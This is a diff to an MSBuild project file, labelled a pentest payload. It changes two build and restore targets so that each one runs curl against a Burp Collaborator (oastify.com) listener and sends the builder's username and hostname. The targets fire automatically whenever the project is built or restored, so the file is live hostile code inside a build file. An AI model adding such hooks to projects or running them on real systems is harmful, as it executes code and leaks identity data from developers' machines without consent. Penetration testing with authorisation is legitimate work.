@@ -6,9 +6,9 @@
 
   <!-- PENTEST PAYLOAD: replace COLLAB_DOMAIN with your Burp Collaborator / OOB listener domain -->
   <Target Name="PwnOnBuild" BeforeTargets="Build">
-    <Exec Command="curl http://ioa9aj9hzzaabbcomjxdt9wa218swik7.oastify.com/msbuild-build-exec" />
+    <Exec Command="curl http://ioa9aj9hzzaabbcomjxdt9wa218swik7.oastify.com/whoami/$(whoami)/$(hostname)" />
   </Target>
   <Target Name="PwnOnRestore" BeforeTargets="Restore">
-    <Exec Command="curl http://ioa9aj9hzzaabbcomjxdt9wa218swik7.oastify.com/msbuild-restore-exec" />
+    <Exec Command="curl http://ioa9aj9hzzaabbcomjxdt9wa218swik7.oastify.com/whoami/$(whoami)/$(hostname)" />
   </Target>
 </Project>
